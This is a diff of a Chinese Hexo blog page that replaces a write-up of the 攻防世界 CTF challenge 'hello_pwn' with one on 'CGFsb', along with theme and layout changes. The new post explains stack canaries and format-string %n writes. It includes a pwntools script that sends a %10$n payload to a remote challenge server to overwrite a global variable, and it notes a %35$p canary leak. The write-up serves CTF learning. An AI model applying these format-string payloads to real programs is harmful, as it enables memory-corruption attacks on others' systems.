@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="攻防世界pwn-hello_pwn, 小哑师兄">
+    <meta name="keywords" content="攻防世界pwn-CGFsb, 小哑师兄">
     <meta name="description" content="将登太行雪满山">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,8 +16,8 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>攻防世界pwn-hello_pwn | 小哑师兄</title>
-    <link rel="icon" type="image/jpeg" href="/medias/avatar.jpg">
+    <title>攻防世界pwn-CGFsb | 小哑师兄</title>
+    <link rel="icon" type="image/jpeg" href="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/avatar.jpg">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
     <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
@@ -33,6 +33,16 @@
 
 
 
+   <style>
+    body{
+       background-image: url(https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/background.png);
+       background-repeat:no-repeat;
+       background-size:cover;
+       background-attachment:fixed;
+    }
+</style>
+
+
 
 <body>
     <header class="navbar-fixed">
@@ -41,7 +51,7 @@
             <div class="brand-logo">
                 <a href="/" class="waves-effect waves-light">
                     
-                    <img src="/medias/avatar.jpg" class="logo-img" alt="LOGO">
+                    <img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/avatar.jpg" class="logo-img" alt="LOGO">
                     
                     <span class="logo-span">小哑师兄</span>
                 </a>
@@ -108,17 +118,6 @@
   
   <li class="hide-on-med-and-down nav-item">
     
-    <a href="/contact" class="waves-effect waves-light">
-      
-      <i class="fas fa-comments" style="zoom: 0.6;"></i>
-      
-      <span>留言板</span>
-    </a>
-    
-  </li>
-  
-  <li class="hide-on-med-and-down nav-item">
-    
     <a href="/friends" class="waves-effect waves-light">
       
       <i class="fas fa-address-book" style="zoom: 0.6;"></i>
@@ -140,7 +139,7 @@
 
     <div class="mobile-head bg-color">
         
-        <img src="/medias/avatar.jpg" class="logo-img circle responsive-img">
+        <img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/avatar.jpg" class="logo-img circle responsive-img">
         
         <div class="logo-name">小哑师兄</div>
         <div class="logo-desc">
@@ -205,17 +204,6 @@
 			    <i class="fa-fw fas fa-user-circle"></i>
 			
 			关于
-		</a>
-          
-        </li>
-        
-        <li class="m-nav-item">
-	  
-		<a href="/contact" class="waves-effect waves-light">
-			
-			    <i class="fa-fw fas fa-comments"></i>
-			
-			留言板
 		</a>
           
         </li>
@@ -307,15 +295,28 @@
 </header>
 
     
+<script src="/libs/cryptojs/crypto-js.min.js"></script>
+<script>
+    (function() {
+        let pwd = '';
+        if (pwd && pwd.length > 0) {
+            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
+                alert('密码错误，将返回主页！');
+                location.href = '/';
+            }
+        }
+    })();
+</script>
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/15.jpg')">
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/wallhaven-jxyowm.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">攻防世界pwn-hello_pwn</h1>
+                    <h1 class="description center-align post-title">攻防世界pwn-CGFsb</h1>
                 </div>
             </div>
         </div>
@@ -362,7 +363,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2023-08-20
+                    2023-07-16
                 </div>
                 
 
@@ -371,7 +372,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    33
+                    197
                 </div>
                 
 
@@ -401,14 +402,25 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>参数覆盖 <strong>小端存储</strong><br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230706222328.png" style="zoom: 50%;" /><br>两个函数参数相差4<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230706222443.png" alt="|in1L|425" style="zoom:50%;" /></p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
-sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token punctuation">)</span>
-payload <span class="token operator">-</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">4</span> <span class="token operator">+</span> <span class="token string">b'aaun'</span>
-sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+                <p>canary保护机制<br><img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230713084732.png" style="zoom:50%;" /><br>在函数入口处，会从gs寄存器上取一个值存放到栈上，在函数退出时会去检查栈中的这个值是否发生变化。<br>存在printf函数，可以通过偏移泄漏出canary的值<br>格式化字符串漏洞，通过%n来修改参数的值<br><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-253638.htm">[原创]格式化字符串漏洞简介-Pwn-看雪-安全社区|安全招聘|kanxue.com</a></p>
+<p><code>%n</code>计算字符个数</p>
+<img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230713163639.png" style="zoom:50%;" />
 
-<img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/20230707094338.png" alt="|in1L|325" style="zoom:50%;" />
+
+<p>pwn CGfsb</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
+context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span>
+sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span> <span class="token number">55756</span><span class="token punctuation">)</span>
+<span class="token comment"># sh = process("./e41a0f684d0e497f87bb309f91737e4d")</span>
+pwnme_addr <span class="token operator">=</span> <span class="token number">0x804A068</span>
+<span class="token comment"># canary_addr = b"%35$p" #可以泄漏出canary的值 </span>
+payload1 <span class="token operator">=</span> p32<span class="token punctuation">(</span>pwnme_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> <span class="token string">b'%10$n'</span> <span class="token comment">#利用%n，将pwnme处的值重写</span>
+<span class="token comment"># gdb.attach(sh)</span>
+sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"please tell me your name:\n"</span><span class="token punctuation">,</span> <span class="token string">b'aaa'</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"leave your message please:\n"</span><span class="token punctuation">,</span> payload1 <span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>[[攻防世界pwn-mary-morton]]</p>
 
                 
             </div>
@@ -435,7 +447,7 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://blog.yangsx.cn/2023/08/20/gong-fang-shi-jie-pwn-hello-pwn/">https://blog.yangsx.cn/2023/08/20/gong-fang-shi-jie-pwn-hello-pwn/</a>
+                    <a href="https://blog.yangsx.cn/2023/07/16/gong-fang-shi-jie-pwn-cgfsb/">https://blog.yangsx.cn/2023/07/16/gong-fang-shi-jie-pwn-cgfsb/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -785,13 +797,13 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2023/08/20/gong-fang-shi-jie-pwn-level2/">
+                <a href="/2023/07/18/gong-fang-shi-jie-pwn-cgpwn2/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="攻防世界pwn-level2">
+                        <img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/wallhaven-7pe3xy.jpg" class="responsive-img" alt="攻防世界pwn-cgpwn2">
                         
-                        <span class="card-title">攻防世界pwn-level2</span>
+                        <span class="card-title">攻防世界pwn-cgpwn2</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -802,7 +814,7 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-08-20
+                            <i class="far fa-clock fa-fw icon-date"></i>2023-07-18
                         </span>
                         <span class="publish-author">
                             
@@ -834,32 +846,44 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2023/08/20/xue-xi-zong-jie/">
+                <a href="/2023/07/12/gong-fang-shi-jie-pwn-level2/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="不能混吃等死!">
+                        <img src="https://yangsxnote-img.oss-cn-beijing.aliyuncs.com/img/wallhaven-rrpp6m.png" class="responsive-img" alt="攻防世界pwn-level2">
                         
-                        <span class="card-title">不能混吃等死!</span>
+                        <span class="card-title">攻防世界pwn-level2</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            记录自己每天的学习情况!
+                            攻防世界入门题
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-08-20
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-07-12
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            xysx
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF/" class="post-category">
+                                    CTF
+                                </a>
+                            
                             
                         </span>
                     </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/PWN/">
+                        <span class="chip bg-color">PWN</span>
+                    </a>
+                    
                 </div>
                 
             </div>
@@ -906,7 +930,7 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
                 <span id="year">2023</span>
             
             <span id="year">2023</span>
-            <a href="/about" target="_blank">xysx</a>
+            <a href="/about" target="_blank">小哑师兄</a>
             |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
             |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
             <br>
@@ -1160,6 +1184,8 @@ $(function () {
 
     
 
+    
+    <script type="text/javascript" src="/libs/background/ribbon-dynamic.js" async="async"></script>
     
 
     
